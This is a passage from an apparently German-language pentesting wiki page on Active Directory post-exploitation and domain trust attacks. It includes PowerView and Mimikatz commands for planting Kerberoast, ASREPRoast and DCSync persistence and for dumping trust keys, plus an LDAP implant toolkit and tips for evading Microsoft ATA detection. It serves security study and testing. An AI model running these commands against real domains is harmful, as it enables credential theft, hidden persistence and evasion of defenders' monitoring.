printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

Wenn **andere Benutzer** auf die **kompromittierte** Maschine **zugreifen**, ist es möglich, **credentials aus dem Speicher zu sammeln** und sogar **Beacons in deren Prozesse zu injizieren**, um sich als sie auszugeben.\
Normalerweise greifen Benutzer über RDP auf das System zu, daher findest du hier, wie man ein paar Angriffe auf Drittanbieter-RDP-Sitzungen durchführt:


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** bietet ein System zur Verwaltung des **lokalen Administrator-Passworts** auf domain-verbundenen Computern, stellt sicher, dass es **zufällig**, eindeutig und häufig **geändert** wird. Diese Passwörter werden in Active Directory gespeichert und der Zugriff wird über ACLs nur für autorisierte Benutzer gesteuert. Mit ausreichenden Berechtigungen zum Zugriff auf diese Passwörter wird Pivoting zu anderen Computern möglich.


{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

Das **Sammeln von Zertifikaten** von der kompromittierten Maschine kann ein Weg sein, um Privilegien innerhalb der Umgebung zu eskalieren:


{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

Wenn **vulnerable templates** konfiguriert sind, ist es möglich, diese zu missbrauchen, um Privilegien zu eskalieren:


{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

Sobald du **Domain Admin** oder noch besser **Enterprise Admin** Rechte erlangt hast, kannst du die **Domain-Datenbank** _ntds.dit_ **auslesen**.

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

Einige der zuvor besprochenen Techniken können für Persistence genutzt werden.\
Zum Beispiel könntest du:

- Benutzer anfällig für [**Kerberoast**](kerberoast.md) machen

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Benutzer anfällig für [**ASREPRoast**](asreproast.md) machen

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Einem Benutzer [**DCSync**](#dcsync)-Privilegien gewähren

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

Der **Silver Ticket attack** erstellt ein **legitimes Ticket Granting Service (TGS) ticket** für einen spezifischen Dienst, indem der **NTLM hash** verwendet wird (zum Beispiel der **Hash des PC-Accounts**). Diese Methode wird eingesetzt, um **Zugriff auf die Dienstprivilegien** zu erhalten.


{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

Ein **Golden Ticket attack** beinhaltet, dass ein Angreifer Zugriff auf den **NTLM-Hash des krbtgt-Accounts** in einer Active Directory-Umgebung erlangt. Dieses Konto ist besonders, weil es verwendet wird, um alle **Ticket Granting Tickets (TGTs)** zu signieren, die für die Authentifizierung innerhalb des AD-Netzwerks essenziell sind.

Sobald der Angreifer diesen Hash hat, kann er **TGTs** für beliebige Accounts erstellen (Silver ticket attack).


{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

Diese sind wie Golden Tickets, jedoch so gefälscht, dass sie **gängige Erkennungsmechanismen für Golden Tickets umgehen**.


{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**Das Besitzen von Zertifikaten eines Accounts oder die Möglichkeit, diese zu beantragen**, ist ein sehr guter Weg, um im Benutzerkonto persistent zu bleiben (selbst wenn das Passwort geändert wird):


{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**Mit Zertifikaten ist es auch möglich, mit hohen Rechten innerhalb der Domain persistent zu bleiben:**


{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Das **AdminSDHolder**-Objekt in Active Directory sorgt für die Sicherheit **privilegierter Gruppen** (wie Domain Admins und Enterprise Admins), indem es eine standardisierte **Access Control List (ACL)** auf diese Gruppen anwendet, um unautorisierte Änderungen zu verhindern. Diese Funktion kann jedoch ausgenutzt werden; wenn ein Angreifer die ACL des AdminSDHolder ändert, um einem normalen Benutzer Vollzugriff zu gewähren, erhält dieser Benutzer umfangreiche Kontrolle über alle privilegierten Gruppen. Dieses Sicherheitsmerkmal, das schützen soll, kann somit nach hinten losgehen und unberechtigten Zugriff ermöglichen, wenn es nicht genau überwacht wird.

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

Auf jedem **Domain Controller (DC)** existiert ein **lokales Administrator**-Konto. Durch das Erlangen von Admin-Rechten auf einer solchen Maschine kann der lokale Administrator-Hash mit **mimikatz** extrahiert werden. Anschließend ist eine Registry-Änderung notwendig, um die Nutzung dieses Passworts zu ermöglichen und so den Remote-Zugriff auf das lokale Administrator-Konto zu erlauben.


{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

Du könntest einem **Benutzer** spezielle **Berechtigungen** an bestimmten Domain-Objekten vergeben, die es dem Benutzer ermöglichen, in der Zukunft **Privilegien zu eskalieren**.


{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

Die **Security Descriptors** werden verwendet, um die **Berechtigungen** zu **speichern**, die ein **Objekt** über ein **Objekt** hat. Wenn du nur eine **kleine Änderung** im **Security Descriptor** eines Objekts vornehmen kannst, kannst du sehr interessante Privilegien über dieses Objekt erlangen, ohne Mitglied einer privilegierten Gruppe sein zu müssen.


{{#ref}}
security-descriptors.md
{{#endref}}

### Dynamic Objects Anti-Forensics / Evasion

Missbrauche die `dynamicObject` auxiliary class, um kurzlebige Principals/GPOs/DNS-Einträge mit `entryTTL`/`msDS-Entry-Time-To-Die` zu erstellen; sie löschen sich selbst ohne Tombstones und entfernen LDAP-Beweise, während sie verwaiste SIDs, gebrochene `gPLink`-Referenzen oder zwischengespeicherte DNS-Antworten hinterlassen können (z. B. AdminSDHolder ACE-Pollution oder bösartige `gPCFileSysPath`/AD-integrierte DNS-Redirects).

{{#ref}}
ad-dynamic-objects-anti-forensics.md
{{#endref}}

### Skeleton Key

Verändere **LSASS** im Speicher, um ein **universelles Passwort** zu etablieren, das Zugriff auf alle Domain-Accounts gewährt.


{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
Du kannst dein **eigenes SSP** erstellen, um die **credentials** im **Klartext** zu erfassen, die zum Zugriff auf die Maschine verwendet werden.


{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

Es registriert einen **neuen Domain Controller** im AD und verwendet ihn, um Attribute (SIDHistory, SPNs...) auf bestimmten Objekten **zu pushen**, **ohne** dabei **Logs** bezüglich der **Änderungen** zu hinterlassen. Du **benötigst DA**-Rechte und musst dich in der **Root-Domain** befinden.\
Beachte, dass bei Verwendung falscher Daten ziemlich hässliche Logs erscheinen können.


{{#ref}}
dcshadow.md
{{#endref}}

### LAPS Persistence

Früher haben wir besprochen, wie man Privilegien eskalieren kann, wenn man **ausreichende Berechtigungen hat, um LAPS-Passwörter zu lesen**. Diese Passwörter können jedoch auch zur **Aufrechterhaltung von Persistence** verwendet werden.\
Siehe:


{{#ref}}
laps.md
{{#endref}}

## Forest Privilege Escalation - Domain Trusts

Microsoft betrachtet den **Forest** als die Sicherheitsgrenze. Das bedeutet, dass **die Kompromittierung einer einzelnen Domain potenziell zur Kompromittierung des gesamten Forests führen kann**.

### Basic Information

Eine [**domain trust**](<http://technet.microsoft.com/en-us/library/cc759554(v=ws.10).aspx>) ist ein Sicherheitsmechanismus, der es einem Benutzer aus einer **Domain** ermöglicht, auf Ressourcen in einer anderen **Domain** zuzugreifen. Er schafft im Wesentlichen eine Verbindung zwischen den Authentifizierungssystemen der beiden Domains, sodass Authentifizierungsüberprüfungen nahtlos fließen können. Wenn Domains eine Trust-Beziehung einrichten, tauschen sie bestimmte **Keys** in ihren **Domain Controllern (DCs)** aus und behalten diese, die für die Integrität des Trusts entscheidend sind.

In einem typischen Szenario, wenn ein Benutzer auf einen Dienst in einer **vertrauenswürdigen Domain** zugreifen möchte, muss er zuerst ein spezielles Ticket, bekannt als **inter-realm TGT**, von seinem eigenen Domain-Controller anfordern. Dieses TGT wird mit einem gemeinsamen **Key** verschlüsselt, auf den sich beide Domains geeinigt haben. Der Benutzer präsentiert dann dieses TGT dem **DC der vertrauenswürdigen Domain**, um ein Service-Ticket (**TGS**) zu erhalten. Nach erfolgreicher Validierung des inter-realm TGT durch den DC der vertrauenswürdigen Domain stellt dieser ein TGS aus, das dem Benutzer Zugriff auf den Dienst gewährt.

**Schritte**:

1. Ein **Client-Computer** in **Domain 1** startet den Prozess, indem er seinen **NTLM Hash** nutzt, um ein **Ticket Granting Ticket (TGT)** von seinem **Domain Controller (DC1)** anzufordern.
2. DC1 stellt ein neues TGT aus, wenn der Client erfolgreich authentifiziert wurde.
3. Der Client fordert dann ein **inter-realm TGT** von DC1 an, das benötigt wird, um auf Ressourcen in **Domain 2** zuzugreifen.
4. Das inter-realm TGT wird mit einem **Trust Key** verschlüsselt, der zwischen DC1 und DC2 als Teil des zweiseitigen Domain Trusts geteilt wird.
5. Der Client bringt das inter-realm TGT zum **Domain Controller (DC2)** von **Domain 2**.
6. DC2 verifiziert das inter-realm TGT mithilfe seines gemeinsamen Trust Keys und stellt, falls gültig, ein **Ticket Granting Service (TGS)** für den Server in Domain 2 aus, auf den der Client zugreifen möchte.
7. Schließlich präsentiert der Client dieses TGS dem Server, das mit dem Hash des Server-Accounts verschlüsselt ist, um Zugriff auf den Dienst in Domain 2 zu erhalten.

### Different trusts

Es ist wichtig zu beachten, dass **ein Trust ein- oder zweiseitig sein kann**. Bei der zweiseitigen Option vertrauen beide Domains einander, aber in der **einseitigen** Trust-Beziehung ist eine der Domains die **trusted** und die andere die **trusting** Domain. In diesem Fall **kannst du nur von der trusted Domain aus auf Ressourcen in der trusting Domain zugreifen**.

Wenn Domain A Domain B vertraut, ist A die trusting Domain und B die trusted Domain. Außerdem wäre dies in **Domain A** ein **Outbound trust**; und in **Domain B** ein **Inbound trust**.

**Different trusting relationships**

- **Parent-Child Trusts**: Dies ist eine übliche Konfiguration innerhalb desselben Forests, bei der eine Child-Domain automatisch eine zweiseitige transitive Trust mit ihrer Parent-Domain hat. Im Wesentlichen bedeutet dies, dass Authentifizierungsanfragen nahtlos zwischen Parent und Child fließen können.
- **Cross-link Trusts**: Auch als "shortcut trusts" bezeichnet, werden diese zwischen Child-Domains eingerichtet, um Referral-Prozesse zu beschleunigen. In komplexen Forests müssen Authentifizierungs-Referrals typischerweise bis zur Forest-Root und dann wieder hinunter in die Ziel-Domain reisen. Durch das Erstellen von Cross-Links wird die Reise verkürzt, was besonders in geografisch verteilten Umgebungen vorteilhaft ist.
- **External Trusts**: Diese werden zwischen verschiedenen, nicht verwandten Domains eingerichtet und sind von Natur aus nicht-transitiv. Laut [Microsofts Dokumentation](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>) sind External Trusts nützlich, um auf Ressourcen in einer Domain außerhalb des aktuellen Forests zuzugreifen, die nicht durch einen Forest Trust verbunden ist. Die Sicherheit wird durch SID-Filtering bei External Trusts erhöht.
- **Tree-root Trusts**: Diese Trusts werden automatisch zwischen der Forest-Root-Domain und einem neu hinzugefügten Tree-Root hergestellt. Obwohl sie nicht häufig vorkommen, sind Tree-Root Trusts wichtig, um neue Domain-Trees zu einem Forest hinzuzufügen, ihnen einen eindeutigen Domain-Namen zu ermöglichen und zweiwegs-transitive Vertrauensstellungen sicherzustellen. Mehr Informationen hierzu finden sich in [Microsofts Anleitung](<https://technet.microsoft.com/en-us/library/cc773178(v=ws.10).aspx>).
- **Forest Trusts**: Diese Art von Trust ist ein zweiseitiger transitiver Trust zwischen zwei Forest-Root-Domains und erzwingt ebenfalls SID-Filtering zur Verbesserung der Sicherheit.
- **MIT Trusts**: Diese Trusts werden mit nicht-Windows, [RFC4120-konformen](https://tools.ietf.org/html/rfc4120) Kerberos-Domains eingerichtet. MIT Trusts sind etwas spezialisierter und richten sich an Umgebungen, die eine Integration mit Kerberos-basierten Systemen außerhalb des Windows-Ökosystems erfordern.

#### Other differences in **trusting relationships**

- Eine Trust-Beziehung kann auch **transitiv** sein (A vertraut B, B vertraut C, dann vertraut A C) oder **nicht-transitiv**.
- Eine Trust-Beziehung kann als **bidirektionaler Trust** (beide vertrauen einander) oder als **einseitiger Trust** (nur einer vertraut dem anderen) eingerichtet werden.

### Attack Path

1. **Enumeriere** die Vertrauensbeziehungen
2. Prüfe, ob irgendein **Security Principal** (User/Group/Computer) **Zugriff** auf Ressourcen der **anderen Domain** hat, möglicherweise durch ACE-Einträge oder durch Mitgliedschaft in Gruppen der anderen Domain. Suche nach **Beziehungen über Domains hinweg** (der Trust wurde vermutlich dafür erstellt).
1. kerberoast könnte in diesem Fall eine weitere Option sein.
3. **Kompromittiere** die **Accounts**, die durch Domains pivoten können.

Angreifer können über drei primäre Mechanismen auf Ressourcen in einer anderen Domain zugreifen:

- **Lokale Gruppenmitgliedschaft**: Principals können zu lokalen Gruppen auf Maschinen hinzugefügt werden, z. B. zur "Administrators"-Gruppe auf einem Server, was ihnen erhebliche Kontrolle über diese Maschine gibt.
- **Mitgliedschaft in Foreign Domain Groups**: Principals können auch Mitglieder von Gruppen innerhalb der fremden Domain sein. Die Wirksamkeit dieser Methode hängt jedoch von der Art des Trusts und dem Umfang der Gruppe ab.
- **Access Control Lists (ACLs)**: Principals können in einer **ACL**, insbesondere als Entities in **ACEs** innerhalb einer **DACL**, spezifiziert sein und damit Zugriff auf bestimmte Ressourcen erhalten. Für diejenigen, die tiefer in die Mechanik von ACLs, DACLs und ACEs einsteigen möchten, ist das Whitepaper “[An ACE Up The Sleeve](https://specterops.io/assets/resources/an_ace_up_the_sleeve.pdf)” eine unschätzbare Ressource.

### Find external users/groups with permissions

Du kannst **`CN=<user_SID>,CN=ForeignSecurityPrincipals,DC=domain,DC=com`** prüfen, um Foreign Security Principals in der Domain zu finden. Dies werden Benutzer/Gruppen aus **einer externen Domain/Forest** sein.

Du kannst das in **Bloodhound** prüfen oder mit powerview:
```powershell
# Get users that are i groups outside of the current domain
Get-DomainForeignUser

# Get groups inside a domain with users our
Get-DomainForeignGroupMember
```
### Child-to-Parent forest privilege escalation
```bash
# Fro powerview
Get-DomainTrust

SourceName      : sub.domain.local    --> current domain
TargetName      : domain.local        --> foreign domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : WITHIN_FOREST       --> WITHIN_FOREST: Both in the same forest
TrustDirection  : Bidirectional       --> Trust direction (2ways in this case)
WhenCreated     : 2/19/2021 1:28:00 PM
WhenChanged     : 2/19/2021 1:28:00 PM
```
Weitere Möglichkeiten, Domänen-Trusts zu ermitteln:
```bash
# Get DCs
nltest /dsgetdc:<DOMAIN>

# Get all domain trusts
nltest /domain_trusts /all_trusts /v

# Get all trust of a domain
nltest /dclist:sub.domain.local
nltest /server:dc.sub.domain.local /domain_trusts /all_trusts
```
> [!WARNING]
> Es gibt **2 trusted keys**, einen für _Child --> Parent_ und einen anderen für _Parent_ --> _Child_.\
> Sie können den von der aktuellen Domain verwendeten Schlüssel damit ermitteln:
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.my.domain.local
> Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'
> ```

#### SID-History Injection

Als Enterprise admin in die child/parent domain eskalieren, indem das trust mit SID-History injection ausgenutzt wird:


{{#ref}}
sid-history-injection.md
{{#endref}}

#### Exploit writeable Configuration NC

Es ist entscheidend zu verstehen, wie die Configuration Naming Context (NC) ausgenutzt werden kann. Die Configuration NC dient als zentrales Repository für Konfigurationsdaten über einen Forest in Active Directory (AD)-Umgebungen. Diese Daten werden an jeden Domain Controller (DC) im Forest repliziert; writable DCs halten eine beschreibbare Kopie der Configuration NC. Um dies auszunutzen, benötigt man **SYSTEM privileges on a DC**, vorzugsweise einen child DC.

**Link GPO to root DC site**

Der Sites-Container der Configuration NC enthält Informationen über die Sites aller domain-joined Computer innerhalb des AD-Forests. Mit SYSTEM privileges auf einem beliebigen DC können Angreifer GPOs an die root DC sites linken. Diese Aktion kann die root domain kompromittieren, indem Policies manipuliert werden, die auf diese Sites angewendet werden.

Für detailliertere Informationen kann man die Forschung zu [Bypassing SID Filtering](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-4-bypass-sid-filtering-research) heranziehen.

**Compromise any gMSA in the forest**

Ein Angriffsvektor zielt darauf ab, privilegierte gMSAs innerhalb der Domain anzugreifen. Der KDS Root key, der für die Berechnung der Passwörter von gMSAs essenziell ist, wird in der Configuration NC gespeichert. Mit SYSTEM privileges auf einem beliebigen DC ist es möglich, auf den KDS Root key zuzugreifen und die Passwörter für beliebige gMSAs im gesamten Forest zu berechnen.

Detaillierte Analysen und Schritt-für-Schritt-Anleitungen finden sich in:


{{#ref}}
golden-dmsa-gmsa.md
{{#endref}}

Komplementärer delegierter MSA-Angriff (BadSuccessor – Missbrauch von migration attributes):


{{#ref}}
badsuccessor-dmsa-migration-abuse.md
{{#endref}}

Weitere externe Forschung: [Golden gMSA Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-5-golden-gmsa-trust-attack-from-child-to-parent).

**Schema change attack**

Diese Methode erfordert Geduld und das Warten auf die Erstellung neuer privilegierter AD-Objekte. Mit SYSTEM privileges kann ein Angreifer das AD Schema so modifizieren, dass jedem Benutzer vollständige Kontrolle über alle Klassen gewährt wird. Das kann zu unautorisiertem Zugriff und Kontrolle über neu erstellte AD-Objekte führen.

Weitere Informationen finden sich in [Schema Change Trust Attacks](https://improsec.com/tech-blog/sid-filter-as-security-boundary-between-domains-part-6-schema-change-trust-attack-from-child-to-parent).

**From DA to EA with ADCS ESC5**

Die ADCS ESC5-Schwachstelle zielt darauf ab, Kontrolle über Public Key Infrastructure (PKI)-Objekte zu erlangen, um ein certificate template zu erstellen, das die Authentifizierung als beliebiger Benutzer im Forest ermöglicht. Da PKI-Objekte in der Configuration NC liegen, erlaubt das Kompromittieren eines writable child DC die Durchführung von ESC5-Angriffen.

Mehr Details dazu finden sich in [From DA to EA with ESC5](https://posts.specterops.io/from-da-to-ea-with-esc5-f9f045aa105c). In Szenarien ohne ADCS kann der Angreifer die benötigten Komponenten selbst aufsetzen, wie in [Escalating from Child Domain Admins to Enterprise Admins](https://www.pkisolutions.com/escalating-from-child-domains-admins-to-enterprise-admins-in-5-minutes-by-abusing-ad-cs-a-follow-up/) beschrieben.

### External Forest Domain - One-Way (Inbound) or bidirectional
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM
```
In diesem Szenario ist Ihre Domain von einer externen Domain vertraut und gewährt Ihnen unbestimmte Berechtigungen darauf. Sie müssen herausfinden, welche principals Ihrer Domain welchen Zugriff auf die externe Domain haben, und dann versuchen, diesen auszunutzen:


{{#ref}}
external-forest-domain-oneway-inbound.md
{{#endref}}

### Externe Forest Domain - Einseitig (Outbound)
```bash
Get-DomainTrust -Domain current.local

SourceName      : current.local   --> Current domain
TargetName      : external.local  --> Destination domain
TrustType       : WINDOWS_ACTIVE_DIRECTORY
TrustAttributes : FOREST_TRANSITIVE
TrustDirection  : Outbound        --> Outbound trust
WhenCreated     : 2/19/2021 10:15:24 PM
WhenChanged     : 2/19/2021 10:15:24 PM
```
In diesem Szenario vertraut **deine Domain** einem Principal aus einer **anderen Domain** bestimmte **Privilegien**.

Allerdings, wenn eine **Domain vertraut wird** durch die vertrauende Domain, erstellt die vertrauene Domain einen Benutzer mit einem **vorhersehbaren Namen**, der als **Passwort das Trust-Passwort** verwendet. Das bedeutet, dass es möglich ist, **einen Benutzer aus der vertrauenden Domain zu verwenden, um in die vertrauete Domain hineinzukommen**, diese zu enumerieren und zu versuchen, weitere Privilegien zu eskalieren:


{{#ref}}
external-forest-domain-one-way-outbound.md
{{#endref}}

Eine weitere Methode, die vertraute Domain zu kompromittieren, ist das Auffinden eines [**SQL trusted link**](abusing-ad-mssql.md#mssql-trusted-links), das in die **umgekehrte Richtung** des Domain-Trusts erstellt wurde (was nicht sehr häufig ist).

Eine andere Möglichkeit, die vertraute Domain zu kompromittieren, besteht darin, auf einem Rechner zu warten, auf den sich ein **Benutzer aus der vertrauten Domain anmelden kann** per **RDP**. Der Angreifer könnte dann Code in den RDP-Session-Prozess injizieren und von dort aus **auf die Ursprungsdomain des Opfers zugreifen**.\
Wenn das **Opfer sein Laufwerk eingebunden hat**, könnte der Angreifer aus dem **RDP-Session**-Prozess **backdoors** im **Autostart-Ordner des Laufwerks** ablegen. Diese Technik heißt **RDPInception.**


{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### Gegenmaßnahmen bei Domain-Trust-Missbrauch

### **SID Filtering:**

- Das Risiko von Angriffen, die das SID-History-Attribut über Forest-Trusts ausnutzen, wird durch SID Filtering gemindert, das standardmäßig bei allen Inter-Forest-Trusts aktiviert ist. Dies basiert auf der Annahme, dass Intra-Forest-Trusts sicher sind und den Forest statt der Domain als Sicherheitsgrenze betrachten, gemäß Microsofts Position.
- Allerdings gibt es einen Haken: SID Filtering kann Anwendungen und Benutzerzugriffe stören, weshalb es gelegentlich deaktiviert wird.

### **Selective Authentication:**

- Bei Inter-Forest-Trusts sorgt der Einsatz von Selective Authentication dafür, dass Benutzer aus den beiden Forests nicht automatisch authentifiziert werden. Stattdessen sind explizite Berechtigungen erforderlich, damit Benutzer auf Domains und Server innerhalb der vertrauenden Domain oder des Forests zugreifen können.
- Es ist wichtig zu beachten, dass diese Maßnahmen nicht vor der Ausnutzung des beschreibbaren Configuration Naming Context (NC) oder vor Angriffen auf das Trust-Konto schützen.

[**Mehr Informationen zu Domain-Trusts auf ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)

## LDAP-basierter AD-Missbrauch von On-Host-Implantaten

Die [LDAP BOF Collection](https://github.com/P0142/LDAP-Bof-Collection) implementiert bloodyAD-style LDAP-Primitiven als x64 Beacon Object Files, die vollständig innerhalb eines On-Host-Implantats (z. B. Adaptix C2) laufen. Operatoren bauen das Paket mit `git clone https://github.com/P0142/ldap-bof-collection.git && cd ldap-bof-collection && make`, laden `ldap.axs` und rufen dann `ldap <subcommand>` vom Beacon aus auf. Der gesamte Traffic nutzt den aktuellen Logon-Sicherheitskontext über LDAP (389) mit signing/sealing oder LDAPS (636) mit automatischem Certificate-Trust, sodass keine Socks-Proxies oder Disk-Artefakte erforderlich sind.

### Implantatseitige LDAP-Enumeration

- `get-users`, `get-computers`, `get-groups`, `get-usergroups` und `get-groupmembers` lösen Kurzformen/OU-Pfade in vollständige DNs auf und dumpen die entsprechenden Objekte.
- `get-object`, `get-attribute` und `get-domaininfo` ziehen beliebige Attribute (einschließlich security descriptors) sowie die Forest/Domain-Metadaten aus `rootDSE`.
- `get-uac`, `get-spn`, `get-delegation` und `get-rbcd` zeigen roasting candidates, Delegationseinstellungen und existierende [Resource-based Constrained Delegation](resource-based-constrained-delegation.md)-Deskriptoren direkt aus LDAP an.
- `get-acl` und `get-writable --detailed` parsen die DACL, listen Trustees, Rechte (GenericAll/WriteDACL/WriteOwner/Attribut-Schreibrechte) und Vererbung auf und liefern damit sofortige Ziele für ACL privilege escalation.
```powershell
ldap get-users --ldaps
ldap get-computers -ou "OU=Servers,DC=corp,DC=local"
ldap get-writable --detailed
ldap get-acl "CN=Tier0,OU=Admins,DC=corp,DC=local"
```
### LDAP write primitives zur Eskalation & Persistenz

- Object creation BOFs (`add-user`, `add-computer`, `add-group`, `add-ou`) erlauben dem Operator, neue principals oder machine accounts dort zu platzieren, wo OU-Rechte vorhanden sind. `add-groupmember`, `set-password`, `add-attribute` und `set-attribute` kapern Ziele direkt, sobald write-property-Rechte festgestellt werden.
- ACL-fokussierte Befehle wie `add-ace`, `set-owner`, `add-genericall`, `add-genericwrite` und `add-dcsync` übersetzen WriteDACL/WriteOwner auf beliebigen AD-Objekten in Passwort-Resets, Gruppenmitgliedschafts-Kontrolle oder DCSync-Replikations-Privilegien, ohne PowerShell/ADSI-Artefakte zu hinterlassen. `remove-*` Gegenstücke entfernen injizierte ACEs.

### Delegation, roasting, and Kerberos abuse

- `add-spn`/`set-spn` machen einen kompromittierten Benutzer sofort Kerberoastable; `add-asreproastable` (UAC-Umschalter) markiert ihn für AS-REP roasting, ohne das Passwort zu verändern.
- Delegation-Makros (`add-delegation`, `set-delegation`, `add-constrained`, `add-unconstrained`, `add-rbcd`) schreiben `msDS-AllowedToDelegateTo`, UAC-Flags oder `msDS-AllowedToActOnBehalfOfOtherIdentity` vom Beacon aus um, ermöglichen constrained/unconstrained/RBCD Angriffswege und eliminieren die Notwendigkeit für remote PowerShell oder RSAT.

### sidHistory injection, OU relocation, and attack surface shaping

- `add-sidhistory` injiziert privilegierte SIDs in die SID-History eines kontrollierten Principals (siehe [SID-History Injection](sid-history-injection.md)), wodurch heimliche Zugriffserbschaften ausschließlich über LDAP/LDAPS ermöglicht werden.
- `move-object` ändert DN/OU von Computern oder Benutzern und erlaubt einem Angreifer, Assets in OUs zu verschieben, in denen bereits delegierte Rechte bestehen, bevor `set-password`, `add-groupmember` oder `add-spn` missbraucht werden.
- Eng gefasste Entfernen-Befehle (`remove-attribute`, `remove-delegation`, `remove-rbcd`, `remove-uac`, `remove-groupmember`, etc.) erlauben ein schnelles Rollback, nachdem der Operator Anmeldeinformationen oder Persistenz erntet hat, und minimieren Telemetrie.

## AD -> Azure & Azure -> AD


{{#ref}}
https://cloud.hacktricks.wiki/en/pentesting-cloud/azure-security/az-lateral-movement-cloud-on-prem/azure-ad-connect-hybrid-identity/index.html
{{#endref}}

## Some General Defenses

[**Learn more about how to protect credentials here.**](../stealing-credentials/credentials-protections.md)

### **Defensive Measures for Credential Protection**

- **Domain Admins Restrictions**: Es wird empfohlen, dass Domain Admins sich nur an Domain Controllers anmelden dürfen und nicht auf anderen Hosts verwendet werden.
- **Service Account Privileges**: Dienste sollten nicht mit Domain Admin (DA) Rechten ausgeführt werden, um die Sicherheit zu gewährleisten.
- **Temporal Privilege Limitation**: Für Aufgaben, die DA-Rechte benötigen, sollte deren Dauer begrenzt werden. Dies kann erreicht werden durch: `Add-ADGroupMember -Identity ‘Domain Admins’ -Members newDA -MemberTimeToLive (New-TimeSpan -Minutes 20)`
- **LDAP relay mitigation**: Überwachen Sie Event-IDs 2889/3074/3075 und erzwingen Sie anschließend LDAP-Signing sowie LDAPS Channel Binding auf DCs/Clients, um LDAP MITM/Relay-Versuche zu blockieren.

{{#ref}}
ldap-signing-and-channel-binding.md
{{#endref}}

### **Implementing Deception Techniques**

- Implementierung von Täuschung beinhaltet das Setzen von Fallen, wie Köder-Benutzer oder -Computer, mit Eigenschaften wie Passwörtern, die nie ablaufen, oder die als Trusted for Delegation markiert sind. Ein detaillierter Ansatz umfasst das Erstellen von Benutzern mit spezifischen Rechten oder das Hinzufügen zu hoch privilegierten Gruppen.
- Ein praktisches Beispiel verwendet Tools wie: `Create-DecoyUser -UserFirstName user -UserLastName manager-uncommon -Password Pass@123 | DeployUserDeception -UserFlag PasswordNeverExpires -GUID d07da11f-8a3d-42b6-b0aa-76c962be719a -Verbose`
- Mehr zum Einsatz von Täuschungstechniken findet sich unter [Deploy-Deception on GitHub](https://github.com/samratashok/Deploy-Deception).

### **Identifying Deception**

- **For User Objects**: Verdächtige Indikatoren schließen atypische ObjectSID, seltene Logons, Erstellungsdaten und niedrige Counts für falsche Passworteingaben ein.
- **General Indicators**: Der Vergleich von Attributen potenzieller Köder-Objekte mit echten Objekten kann Inkonsistenzen aufdecken. Werkzeuge wie [HoneypotBuster](https://github.com/JavelinNetworks/HoneypotBuster) können bei der Identifikation solcher Täuschungen helfen.

### **Bypassing Detection Systems**

- **Microsoft ATA Detection Bypass**:
- **User Enumeration**: Vermeiden von Session-Enumeration auf Domain Controllers, um ATA-Erkennung zu verhindern.
- **Ticket Impersonation**: Die Nutzung von **aes**-Keys zur Ticketerstellung hilft, Erkennung zu umgehen, indem ein Downgrade auf NTLM vermieden wird.
- **DCSync Attacks**: Ausführung von DCSync von einem Nicht-Domain-Controller wird empfohlen, da direkte Ausführung auf einem Domain Controller Alerts auslöst.

## References

- [http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/](http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts/)
- [https://www.labofapenetrationtester.com/2018/10/deploy-deception.html](https://www.labofapenetrationtester.com/2018/10/deploy-deception.html)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/child-domain-da-to-ea-in-parent-domain)
- [LDAP BOF Collection – In-Memory LDAP Toolkit for Active Directory Exploitation](https://github.com/P0142/LDAP-Bof-Collection)
- [TrustedSec – Holy Shuck! Weaponizing NTLM Hashes as a Wordlist](https://trustedsec.com/blog/holy-shuck-weaponizing-ntlm-hashes-as-a-wordlist)
- [Barbhack 2025 CTF (NetExec AD Lab) – Pirates](https://0xdf.gitlab.io/2026/01/29/barbhack-2025-ctf.html)
- [Hashcat](https://github.com/hashcat/hashcat)

